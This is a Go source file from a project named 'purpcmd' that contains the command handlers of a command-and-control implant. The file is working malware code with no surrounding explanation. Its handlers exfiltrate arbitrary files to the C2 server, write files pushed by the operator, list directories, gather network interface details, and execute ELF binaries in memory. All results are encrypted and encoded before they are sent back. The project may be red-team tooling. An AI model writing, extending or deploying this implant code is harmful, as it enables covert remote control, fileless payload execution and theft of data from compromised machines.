package core

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"purpcmd/implant"
	"purpcmd/internal/encrypt"
	"strings"

	//"strings"
	"syscall"
)

// CommandContext holds the common context needed by all command handlers
type CommandContext struct {
	Implant *implant.ImplantMetadata
	Encrypt *encrypt.Encrypt
	HTTP    *Request
}

// HandlePing handles the PING command
func HandlePing(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> PING")
	responseTaskPayload := string(payload) + " pong"
	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)

	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleDownload handles the DOWN command - uploads file content to C2
func HandleDownload(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> DOWN")

	// Get filename from payload
	filename := string(payload)
	if filename == "" {
		responseTaskPayload := "Error: No filename provided for download"
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	// Read file contents
	fileData, err := os.ReadFile(filename)
	if err != nil {
		responseTaskPayload := fmt.Sprintf("Error reading file %s: %s", filename, err.Error())
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	println(fmt.Sprintf("Uploading file %s (%d bytes) to C2", filename, len(fileData)))

	// Pack file as chunk and send to C2
	taskResp := PackChunk(ctx.Implant, filename, fileData, tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleUpload handles the UPL command
func HandleUpload(ctx *CommandContext, payload []byte, tid [8]byte) string {
	//Step		Size	Offset (bytes)
	//nameLen	2		0
	//name		N		2
	//dataLen	4		2 + N
	//data		M		2 + N + 4
	println("\n-> UPL")
	nameLen := binary.BigEndian.Uint16(payload[:2])
	name := payload[2 : 2+nameLen]

	dataLenStart := 2 + nameLen
	dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])

	dataStart := dataLenStart + 4
	data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]

	println("got file name ", string(name), " with ", dataLen, " bytes")

	// Write file to disk
	err := os.WriteFile(string(name), data, 0644)

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = fmt.Sprintf("Failed to save file %s: %s", string(name), err.Error())
	} else {
		responseTaskPayload = fmt.Sprintf("Saved file to %s (%d bytes)", string(name), len(data))
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleCD handles the CD (change directory) command
func HandleCD(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> CD")
	dir := string(payload)
	err := os.Chdir(dir)

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = "Failed to change directory: " + err.Error()
	} else {
		cwd, _ := os.Getwd()
		responseTaskPayload = "Changed directory to: " + cwd
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandlePWD handles the PWD (print working directory) command
func HandlePWD(ctx *CommandContext, tid [8]byte) string {
	println("\n-> PWD")
	cwd, err := os.Getwd()

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = "Failed to get working directory: " + err.Error()
	} else {
		responseTaskPayload = cwd
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleKill handles the KILL command
func HandleKill() {
	println("\n-> KILL")
	os.Exit(0)
}

// HandleLS handles the LS (list files) command
func HandleLS(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> LS")

	// Determine directory to list
	dir := "."
	if len(payload) > 0 {
		dir = string(payload)
	}

	// Read directory entries
	entries, err := os.ReadDir(dir)
	if err != nil {
		responseTaskPayload := "Failed to list directory: " + err.Error()
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	// Build formatted output
	var output string
	output += fmt.Sprintf("Listing directory: %s\n\n", dir)
	output += fmt.Sprintf("%-10s %-8s %-8s %10s  %s\n", "PERMS", "OWNER", "GROUP", "SIZE", "NAME")
	output += "------------------------------------------------------------\n"

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		// Get permissions
		perms := info.Mode().String()

		// Get size
		size := info.Size()

		// Get owner and group (Linux-specific)
		owner := "?"
		group := "?"
		if stat, ok := info.Sys().(*syscall.Stat_t); ok {
			owner = fmt.Sprintf("%d", stat.Uid)
			group = fmt.Sprintf("%d", stat.Gid)
		}

		output += fmt.Sprintf("%-10s %-8s %-8s %10d  %s\n", perms, owner, group, size, entry.Name())
	}

	taskResp := PackResponse(ctx.Implant, []byte(output), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleMEMEXEC handles the EXEC command - executes ELF binary in memory
func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> EXEC")

	// Payload format:
	// Bytes 0-1: length of arguments string (big endian)
	// Bytes 2 to 2+argsLen: arguments (space-separated)
	// Remaining bytes: ELF binary data

	if len(payload) < 2 {
		responseTaskPayload := "Error: Invalid payload for EXEC command"
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	// Parse arguments length
	/*argsLen := binary.BigEndian.Uint16(payload[:2])

	// Ensure we have enough data
	if len(payload) < int(2+argsLen) {
		responseTaskPayload := "Error: Payload too short for specified arguments"
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	// Extract arguments
	var args []string
	if argsLen > 0 {
		argsStr := string(payload[2 : 2+argsLen])
		if argsStr != "" {
			args = strings.Fields(argsStr)
		}
	}

	// Extract ELF binary data
	elfData := payload[2+argsLen:]

	if len(elfData) == 0 {
		responseTaskPayload := "Error: No ELF binary data provided"
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	println(fmt.Sprintf("Executing ELF binary in memory (%d bytes) with args: %v", len(elfData), args))

	// Execute ELF in memory*/
	nameLen := binary.BigEndian.Uint16(payload[:2])
	name := payload[2 : 2+nameLen]

	dataLenStart := 2 + nameLen
	dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])

	dataStart := dataLenStart + 4
	data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]

	//TODO: do the argument passing wright
	output, err := ExecuteELFInMemory(data, []string{string(name)})

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = fmt.Sprintf("Execution error: %s\n\nOutput:\n%s", err.Error(), output)
	} else {
		responseTaskPayload = output
		if responseTaskPayload == "" {
			responseTaskPayload = "[No output - execution successful]"
		}
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleIFCONFIG handles the IFCONFIG command - displays network interface information
func HandleIFCONFIG(ctx *CommandContext, tid [8]byte) string {
	println("\n-> IFCONFIG")

	// Get all network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		responseTaskPayload := fmt.Sprintf("Error getting network interfaces: %s", err.Error())
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	var output strings.Builder
	output.WriteString("Network Interfaces:\n")
	output.WriteString("==================\n\n")

	for _, iface := range interfaces {
		// Interface name and flags
		output.WriteString(fmt.Sprintf("%s: flags=%d<%s>\n", iface.Name, iface.Flags, iface.Flags.String()))

		// MAC address
		if len(iface.HardwareAddr) > 0 {
			output.WriteString(fmt.Sprintf("    HWaddr: %s\n", iface.HardwareAddr.String()))
		}

		// MTU
		output.WriteString(fmt.Sprintf("    MTU: %d\n", iface.MTU))

		// Get addresses
		addrs, err := iface.Addrs()
		if err != nil {
			output.WriteString(fmt.Sprintf("    Error getting addresses: %s\n", err.Error()))
		} else {
			for _, addr := range addrs {
				// Parse the address
				var ip net.IP
				var mask net.IPMask

				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
					mask = v.Mask
				case *net.IPAddr:
					ip = v.IP
				}

				if ip == nil {
					continue
				}

				// Determine address type
				addrType := "inet"
				if ip.To4() == nil {
					addrType = "inet6"
				}

				// Format output
				if mask != nil {
					// Calculate network and broadcast (for IPv4)
					if ip.To4() != nil {
						ipnet := &net.IPNet{IP: ip, Mask: mask}
						network := ipnet.IP.Mask(mask)

						// Calculate broadcast
						broadcast := make(net.IP, len(network))
						copy(broadcast, network)
						for i := range broadcast {
							broadcast[i] |= ^mask[i]
						}

						maskSize, _ := mask.Size()
						output.WriteString(fmt.Sprintf("    %s: %s  netmask: %s  broadcast: %s  (/%d)\n",
							addrType, ip.String(), net.IP(mask).String(), broadcast.String(), maskSize))
					} else {
						// IPv6
						maskSize, _ := mask.Size()
						output.WriteString(fmt.Sprintf("    %s: %s  prefixlen: %d\n",
							addrType, ip.String(), maskSize))
					}
				} else {
					output.WriteString(fmt.Sprintf("    %s: %s\n", addrType, ip.String()))
				}
			}
		}

		// Interface statistics (Linux-specific)
		if stat, ok := getInterfaceStats(iface.Name); ok {
			output.WriteString(fmt.Sprintf("    RX packets:%d  bytes:%d\n", stat.RxPackets, stat.RxBytes))
			output.WriteString(fmt.Sprintf("    TX packets:%d  bytes:%d\n", stat.TxPackets, stat.TxBytes))
		}

		output.WriteString("\n")
	}

	taskResp := PackResponse(ctx.Implant, []byte(output.String()), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// InterfaceStats holds basic network interface statistics
type InterfaceStats struct {
	RxPackets uint64
	RxBytes   uint64
	TxPackets uint64
	TxBytes   uint64
}

// getInterfaceStats reads interface statistics from /sys/class/net (Linux-specific)
func getInterfaceStats(ifname string) (InterfaceStats, bool) {
	var stats InterfaceStats
	basePath := fmt.Sprintf("/sys/class/net/%s/statistics/", ifname)

	// Try to read statistics files
	if data, err := os.ReadFile(basePath + "rx_packets"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.RxPackets)
	} else {
		return stats, false
	}

	if data, err := os.ReadFile(basePath + "rx_bytes"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.RxBytes)
	}

	if data, err := os.ReadFile(basePath + "tx_packets"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.TxPackets)
	}

	if data, err := os.ReadFile(basePath + "tx_bytes"); err == nil {
		fmt.Sscanf(string(data), "%d", &stats.TxBytes)
	}

	return stats, true
}
